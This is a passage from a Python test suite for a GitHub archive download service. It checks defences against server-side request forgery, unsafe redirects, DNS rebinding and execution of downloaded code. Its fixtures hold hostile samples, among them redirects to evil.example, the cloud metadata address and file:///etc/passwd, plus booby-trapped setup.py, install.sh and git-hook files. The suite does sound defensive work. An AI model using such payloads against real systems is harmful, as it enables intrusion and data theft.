    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    temp_downloads: list[Any],
    error: Exception,
    detail: str,
) -> None:
    github.get(pinned(ARCHIVE_URL)).mock(side_effect=error)
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == detail
    assert "Traceback" not in response.text
    await _assert_failed_cleanly(db_session, data_dir, alice, temp_downloads)


@requires_db
async def test_total_download_timeout(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    monkeypatch: pytest.MonkeyPatch,
    temp_downloads: list[Any],
) -> None:
    monkeypatch.setattr(github_service, "TOTAL_TIMEOUT_SECONDS", 0.3)
    stream = Stream([CHUNK] * 100, delay=0.1)  # a slow, trickling server
    _serve(github, stream)
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "GitHub download timed out"
    assert stream.sent < 100
    await _assert_failed_cleanly(db_session, data_dir, alice, temp_downloads)


# --- API: redirects ----------------------------------------------------------------------


@requires_db
@pytest.mark.parametrize(
    "location",
    [
        "https://evil.example/steal.zip",
        "http://codeload.github.com/octo/demo/zip/refs/heads/main",
        "https://codeload.github.com.evil.example/x.zip",
        "https://codeload.github.com:8443/x.zip",
        "https://user:pw@codeload.github.com/x.zip",
        "https://127.0.0.1/x.zip",
        "https://169.254.169.254/latest/meta-data",
        "file:///etc/passwd",
        "//evil.example/x.zip",
    ],
)
async def test_redirect_outside_github_rejected(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    location: str,
) -> None:
    github.get(pinned(ARCHIVE_URL)).mock(return_value=httpx.Response(302, headers={"Location": location}))
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "GitHub redirected to an unsupported location"
    assert [_logical(c.request) for c in github.calls] == [ARCHIVE_URL]  # target never requested
    await _assert_failed_cleanly(db_session, data_dir, alice)


@requires_db
async def test_relative_redirect_on_github_followed(
    client: httpx.AsyncClient, alice: Owner, github: respx.MockRouter
) -> None:
    moved = "https://github.com/octo/demo-renamed/archive/HEAD.zip"
    github.get(pinned(ARCHIVE_URL)).mock(
        return_value=httpx.Response(301, headers={"Location": "/octo/demo-renamed/archive/HEAD.zip"})
    )
    github.get(pinned(moved)).mock(return_value=httpx.Response(302, headers={"Location": CODELOAD_URL}))
    github.get(pinned(CODELOAD_URL)).mock(return_value=httpx.Response(200, content=_zip(ARCHIVE)))
    response = await _ingest(client, alice)
    assert response.status_code == 202
    assert [_logical(c.request) for c in github.calls] == [ARCHIVE_URL, moved, CODELOAD_URL]


@requires_db
async def test_redirect_loop_and_chain_limits(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
) -> None:
    github.get(pinned(ARCHIVE_URL)).mock(return_value=httpx.Response(302, headers={"Location": CODELOAD_URL}))
    github.get(pinned(CODELOAD_URL)).mock(return_value=httpx.Response(302, headers={"Location": ARCHIVE_URL}))
    loop = await _ingest(client, alice)
    assert await _job_error(client, alice, loop) == "GitHub redirect loop detected"
    assert github.calls.call_count == 2
    await _assert_failed_cleanly(db_session, data_dir, alice)

    github.reset()
    hops = [f"https://codeload.github.com/hop/{i}" for i in range(10)]
    github.get(pinned(ARCHIVE_URL)).mock(return_value=httpx.Response(302, headers={"Location": hops[0]}))
    for current, following in zip(hops, hops[1:], strict=False):
        github.get(pinned(current)).mock(return_value=httpx.Response(302, headers={"Location": following}))
    chain = await _ingest(client, alice)
    assert await _job_error(client, alice, chain) == "GitHub redirected too many times"
    assert github.calls.call_count == github_service.MAX_REDIRECTS + 1


@requires_db
async def test_redirect_without_location_is_unexpected(
    client: httpx.AsyncClient, alice: Owner, github: respx.MockRouter
) -> None:
    github.get(pinned(ARCHIVE_URL)).mock(return_value=httpx.Response(302))
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "GitHub returned an unexpected response"


# --- Security properties -----------------------------------------------------------------


@requires_db
async def test_downloaded_code_is_never_executed(
    client: httpx.AsyncClient,
    tmp_path: Path,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    guard: Guard,
) -> None:
    marker = tmp_path / "executed.txt"
    payload = f"open({str(marker)!r}, 'w').write('pwned')\n".encode()
    _serve(
        github,
        _zip(
            {
                "demo/setup.py": payload,
                "demo/__init__.py": payload,
                "demo/install.sh": b"#!/bin/sh\ngit clone https://evil.example/x\n",
                "demo/.git/hooks/post-checkout": b"#!/bin/sh\ntouch /tmp/pwned\n",
            }
        ),
    )
    response = await _ingest(client, alice)
    assert response.status_code == 202
    assert not marker.exists()
    assert guard.subprocesses == []
    stored = _storage(data_dir, alice.repository_id) / "demo" / "setup.py"
    assert stored.read_bytes() == payload


def test_client_ignores_proxy_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    captured: dict[str, Any] = {}

    def capturing(*args: Any, **kwargs: Any) -> httpx.AsyncClient:
        captured.update(kwargs)
        raise httpx.ConnectError("stop here")

    monkeypatch.setattr(github_service.httpx, "AsyncClient", capturing)
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.evil.example:3128")
    with tempfile.TemporaryFile() as dest, pytest.raises(GitHubError):
        asyncio.run(github_service.download_archive(ARCHIVE_URL, dest, 1024))
    assert captured["trust_env"] is False  # proxy variables and .netrc are ignored
    assert captured["follow_redirects"] is False  # redirects are validated manually
    timeout = captured["timeout"]
    assert timeout.connect == github_service.CONNECT_TIMEOUT_SECONDS
    assert timeout.read == github_service.READ_TIMEOUT_SECONDS


# --- DNS validation (defense in depth against rebinding / non-public answers) ------------

NON_PUBLIC_ADDRESSES = [
    "127.0.0.1",  # loopback
    "127.10.20.30",
    "::1",
    "10.0.0.1",  # RFC 1918
    "10.255.255.254",
    "172.16.0.1",
    "172.31.255.254",
    "192.168.0.1",
    "192.168.255.254",
    "169.254.169.254",  # link-local / cloud metadata service
    "169.254.1.1",
    "fe80::1",  # IPv6 link-local
    "fe80::1%1",
    "fc00::1",  # IPv6 unique local (private)
    "fd12:3456:789a::1",
    "0.0.0.0",  # unspecified
    "::",
    "224.0.0.1",  # multicast (is_global is True for some multicast ranges)
    "233.252.0.1",
    "ff02::1",
    "100.64.0.1",  # carrier-grade NAT
    "192.0.2.10",  # documentation
    "198.18.0.1",  # benchmarking
    "240.0.0.1",  # reserved
    "255.255.255.255",
    "::ffff:127.0.0.1",  # IPv4-mapped IPv6
    "::ffff:10.0.0.1",
    "::ffff:169.254.169.254",
    "not-an-ip",
    "",
]
PUBLIC_ADDRESSES = [
    "140.82.112.3",
    "8.8.8.8",
    "172.32.0.1",
    "2606:50c0:8000::153",
    "2001:4860:4860::8888",
]


@pytest.mark.parametrize("address", NON_PUBLIC_ADDRESSES)
def test_non_public_addresses_rejected(address: str) -> None:
    assert github_service.is_public_address(address) is False


@pytest.mark.parametrize("address", PUBLIC_ADDRESSES)
def test_public_addresses_allowed(address: str) -> None:
    assert github_service.is_public_address(address) is True


async def test_real_resolver_result_for_localhost_is_rejected(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Uses the real resolver (localhost resolves locally, no network) behind the real check.
    monkeypatch.setattr(github_service, "resolve_host", REAL_RESOLVE_HOST)
    addresses = await github_service.resolve_host("localhost")
    assert addresses
    assert not any(github_service.is_public_address(a) for a in addresses)
    with pytest.raises(GitHubError) as excinfo:
        await github_service._resolve_public_address("localhost")
    assert (excinfo.value.status_code, excinfo.value.detail) == (
        502,
        "GitHub resolved to a non-public address",
    )


@requires_db
async def test_dns_checked_before_each_connection_and_connection_pinned(
    client: httpx.AsyncClient, alice: Owner, github: respx.MockRouter, dns: FakeDNS
) -> None:
    def respond(response: httpx.Response) -> Any:
        def side_effect(request: httpx.Request) -> httpx.Response:
            dns.events.append(f"http:{request.headers['host']}")
            return response

        return side_effect

    github.get(pinned(ARCHIVE_URL)).mock(
        side_effect=respond(httpx.Response(302, headers={"Location": CODELOAD_URL}))
    )
    github.get(pinned(CODELOAD_URL)).mock(
        side_effect=respond(httpx.Response(200, content=_zip(ARCHIVE)))
    )
    response = await _ingest(client, alice)
    assert response.status_code == 202
    # Each hop: DNS answer checked first, then the connection.
    assert dns.events == [
        "dns:github.com",
        "http:github.com",
        "dns:codeload.github.com",
        "http:codeload.github.com",
    ]
    first, second = (call.request for call in github.calls)
    # The connection targets the validated address; Host and TLS SNI stay the GitHub name.
    assert (first.url.host, first.headers["host"], first.extensions["sni_hostname"]) == (
        GITHUB_IP,
        "github.com",
        "github.com",
    )
    assert (second.url.host, second.headers["host"], second.extensions["sni_hostname"]) == (
        CODELOAD_IP,
        "codeload.github.com",
        "codeload.github.com",
    )


@requires_db
@pytest.mark.parametrize(
    "answer",
    [
        ["127.0.0.1"],
        ["::1"],
        ["10.1.2.3"],
        ["172.16.5.4"],
        ["192.168.10.20"],
        ["169.254.169.254"],
        ["fe80::1"],
        ["fd00::1"],
        ["0.0.0.0"],
        ["::"],
        ["224.0.0.1"],
        ["::ffff:127.0.0.1"],
        [GITHUB_IP, "10.0.0.1"],  # one bad address poisons the whole answer
        [],
    ],
)
async def test_non_public_dns_answer_blocks_connection(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    dns: FakeDNS,
    temp_downloads: list[Any],
    answer: list[str],
) -> None:
    dns.answers["github.com"] = answer
    _serve(github, _zip(ARCHIVE))
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "GitHub resolved to a non-public address"
    assert dns.lookups == ["github.com"]
    assert github.calls.call_count == 0  # no connection was attempted
    await _assert_failed_cleanly(db_session, data_dir, alice, temp_downloads)


@requires_db
@pytest.mark.parametrize(
    "redirect_answer", [["169.254.169.254"], ["10.0.0.1"], ["127.0.0.1"], ["fc00::1"]]
)
async def test_redirect_to_github_host_with_non_public_dns_rejected(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    dns: FakeDNS,
    redirect_answer: list[str],
) -> None:
    dns.answers["codeload.github.com"] = redirect_answer
    github.get(pinned(ARCHIVE_URL)).mock(
        return_value=httpx.Response(302, headers={"Location": CODELOAD_URL})
    )
    for address in redirect_answer:
        netloc = f"[{address}]" if ":" in address else address
        github.get(f"https://{netloc}/octo/demo/zip/refs/heads/main").mock(
            return_value=httpx.Response(200, content=_zip(ARCHIVE))
        )
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "GitHub resolved to a non-public address"
    assert dns.lookups == ["github.com", "codeload.github.com"]
    assert [_logical(c.request) for c in github.calls] == [ARCHIVE_URL]  # never connected
    await _assert_failed_cleanly(db_session, data_dir, alice)


@requires_db
async def test_redirect_to_github_itself_with_non_public_dns_rejected(
    client: httpx.AsyncClient, alice: Owner, github: respx.MockRouter, dns: FakeDNS
) -> None:
    # Even the original host is re-checked on every hop (the answer changes after hop one).
    calls = {"count": 0}

    def flip_dns(request: httpx.Request) -> httpx.Response:
        calls["count"] += 1
        dns.answers["github.com"] = ["192.168.1.1"]
        return httpx.Response(302, headers={"Location": "/octo/other/archive/HEAD.zip"})

    github.get(pinned(ARCHIVE_URL)).mock(side_effect=flip_dns)
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "GitHub resolved to a non-public address"
    assert calls["count"] == 1
    assert dns.lookups == ["github.com", "github.com"]


@requires_db
async def test_dns_failure_handled(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    dns: FakeDNS,
) -> None:
    del dns.answers["github.com"]  # the mocked resolver raises socket.gaierror
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "Could not resolve GitHub"
    assert github.calls.call_count == 0
    await _assert_failed_cleanly(db_session, data_dir, alice)


@requires_db
async def test_public_ipv6_answer_is_used(
    client: httpx.AsyncClient, alice: Owner, github: respx.MockRouter, dns: FakeDNS
) -> None:
    dns.answers["github.com"] = ["2606:50c0:8000::153"]
    github.get("https://[2606:50c0:8000::153]/octo/demo/archive/HEAD.zip").mock(
        return_value=httpx.Response(302, headers={"Location": CODELOAD_URL})
    )
    github.get(pinned(CODELOAD_URL)).mock(return_value=httpx.Response(200, content=_zip(ARCHIVE)))
    response = await _ingest(client, alice)
    assert response.status_code == 202
    assert github.calls[0].request.url.host == "2606:50c0:8000::153"
    assert github.calls[0].request.headers["host"] == "github.com"
